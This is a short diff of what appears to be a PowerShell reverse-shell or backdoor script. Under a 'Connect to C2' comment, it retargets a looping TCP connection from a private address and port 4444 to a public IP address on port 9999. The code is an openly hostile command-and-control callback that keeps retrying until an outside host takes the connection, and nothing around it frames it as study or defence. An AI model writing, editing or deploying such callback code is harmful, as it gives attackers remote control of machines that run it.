@@ -4,7 +4,7 @@ do {
 
     # Connect to C2
     try{
-        $TCPClient = New-Object Net.Sockets.TCPClient('10.153.83.147', 4444)
+        $TCPClient = New-Object Net.Sockets.TCPClient('31.10.231.212', 9999)
     } catch {}
 } until ($TCPClient.Connected)
 
